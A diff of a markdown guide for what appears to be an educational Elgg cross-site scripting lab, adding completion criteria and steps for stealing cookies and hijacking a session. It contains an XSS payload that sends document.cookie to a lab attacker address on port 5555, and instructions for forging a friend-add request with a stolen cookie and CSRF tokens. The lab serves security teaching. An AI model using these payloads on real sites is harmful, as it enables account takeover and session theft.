@@ -88,6 +88,11 @@ The "Brief Description" section will be rendered in other users' browsers when t
 ```
 - After saving this, you will be returned to your profile page.  This shoud cause the browser to render this script and provide a pop-up alert. Try loggin out and testing this from an innocent victim's account.  
 
+- You will have successfully completed this task once you have been able to get a pop-up alert (with a message) to appear upon any browser session open to Samy's profile page.
+
+Bonus Info
+=====
+
 In this example, the JavaScript code is short enough to be typed into the short description field. If you want to run a longer JavaScript snippet, but you are limited by the number of characters you can type into the form, you can take a different approach. 
 
 Store the JavaScript program in a standalone file, save it with the .js extension, and then refer to it using the 'src' attribute in the <script> tag. See the following example:
@@ -112,6 +117,8 @@ The objective of this task is to embed a JavaScript program in your Elgg profile
 <script>alert(document.cookie);</script>
 ```
 
+- You will have successfully completed this task once you have been able to get a pop-up to appear upon any browser session open to Samy's profile page, which displays the user's cookie.
+
 Task 3: Stealing Cookies from the Victim’s Machine
 ===============
 
@@ -121,12 +128,17 @@ We can do this by having the malicious JavaScript insert an *<*img*>* tag with i
 
 - The JavaScript snippet provided below sends the cookie information to port 5555 of the attacker’s machine, where the attacker has a TCP server listening to the same port. 
 
-- The TCP server program on the attacker's machine will print out what it recieved. The code for this application is in the echoserver directory on the attacker computer. 
-
 **Note that in the output, the "=" character gets transformed to %3D (hex).
 ```
-<script>document.write('<img src=http://attacker_IP_address:5555?c='+ escape(document.cookie) + ' >');</script>
+<script>document.write('<img src=http://172.25.0.3:5555?c='+ escape(document.cookie) + ' >');</script>
+
+# The attacker's IP address  is 172.25.0.3
 ```
+- The TCP server program on the attacker's machine will print out what it recieved. to start this application on the attacker's machine, navigate to the "echoserver" directory.
+- Access the "README" file and figure out how to run this program.  You **MUST** start the schoserv program before doing the XSS so that the attacker's machine can recieve the cookie informaiton that is sent.
+
+- You will have completed this task once you have successfully been able to transmit cookie information from a user's session to the attacker's machine and read this out through the echoserv program.
+
 
 Task 4: Session Hijacking using the Stolen Cookies
 ===============
@@ -135,53 +147,37 @@ After stealing the victim’s cookies, the attacker can do whatever the victim c
 
 To add a friend for the victim, we should first find out how a legitimate user adds a friend in Elgg. More specifically, we need to figure out what are sent to the server when a user adds a friend. Firefox’s Web Developer / Network tool can help us; it can display the contents of any HTTP request message sent from the browser. From the contents, we can identify all the parameters in the request.
 
+- Open the Web Developer > Network Tool in your firefox browser.
+- Now add Charlie as a friend.  Look at the very first "GET" request. You should be able to obtain the elgg_ts and elgg_token. Also note that Charlie's user ID is 41.
+
+**Note:** Elgg uses two parameters elgg ts and elgg token as a countermeasure to defeat another related attack (Cross Site Request Forgery). Make sure that you set these parameters correctly for your attack to succeed. The ts and token values shown here will be different than what you see...this is only an example!
+- **Remove Charlie as a friend so you can test adding friends with your attacker's malicious program.
+
 ```
-[http://www.xsslabelgg.com/action/friends/add?friend=40&](http://www.xsslabelgg.com/action/friends/add?friend=40)
-elgg_ts=1402467511& elgg_token=80923e114f5d6c5606b7efaa389213b3
-
 GET /action/friends/add?friend=40& elgg_ts=1402467511& elgg_token=80923e114f5d6c5606b7efaa389213b3
-
-HTTP/1.1
-Host: [www.xsslabelgg.com](http://www.xsslabelgg.com/)
-User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101
-Firefox/23.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: <http://www.xsslabelgg.com/profile/elgguser2> Cookie:Elgg=7pgvml3vh04m9k99qj5r7ceho4
-Connection: keep-alive
-
-HTTP/1.1 302 Found
-Date: Wed, 11 Jun 2014 06:19:28 GMT
-Server: Apache/2.2.22 (Ubuntu)
-X-Powered-By: PHP/5.3.10-1ubuntu3.11 Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate, post-check=0,pre-check=0
-Pragma: no-cache
-Location: <http://www.xsslabelgg.com/profile/elgguser2> Content-Length: 0
-Keep-Alive: timeout=5, max=100 Connection: Keep-Alive
-Content-Type: text/html
-
 ```
 
 Once we have understood what the HTTP request for adding friends look like, we can write a Java program to send out the same HTTP request. The Elgg server cannot distinguish whether the request is sent out by the victim’s browser or by the attacker’s Java program. As long as we set all the parameters correctly, and the session cookie is attached, the server will accept and process the project-posting HTTP request. To simplify your task, the HTTPSimpleForge directory on the attacker computer contains a sample Java program that does the following:
 
+ - Navigate to the "/HTTPSimpleForge" directory on the attacker machine and open the "HTTPSimpleForge.java" program in the text editor leafpad:
+ 
+ ```
+ leafpad HTTPSimpleForge.java
+ ```
+ 
+ - You will now need to hand-code the elgg ts and token values from the information you learned in the previous steps. 
+ 
+- You will now hand-code the cookie value (obtained using the technique in Task 3) into this program. In practice, such a program would read the cookie value off of the network as was done in Task 3.
+
+- The cookie value itself will be replaced in the program in the "<<correct_cookie>> field. The line in the program should now read:
+
 ```
-1.  Open a connection to web server.
-
-2.  Set the necessary HTTP header information.
-
-3.  Send the request to web server.
-
-4.  Get the response from web server.
+String cookies = "RANDOMSTRING_COOKIE_INFO"
 ```
 
-   Note you are permitted to hand-code cookie values (obtained using the technique in Task 3) into this program. In practice, such a program would read the cookie value off of the network as was done in Task 3.
+-Save the file and close leafpad.
 
-If you have trouble understanding the sample Java program, we suggest you to  read the following:
 
--   JDK 8 Documentation: <https://docs.oracle.com/javase/8/docs/api/>
-
--   Java Protocol Handler:  <http://java.sun.com/developer/onlineTraining/protocolhandlers/>
 
 **Note 1:** Elgg uses two parameters elgg ts and elgg token as a countermeasure to defeat another related attack (Cross Site Request Forgery). Make sure that you set these parameters correctly for your attack to succeed.
 
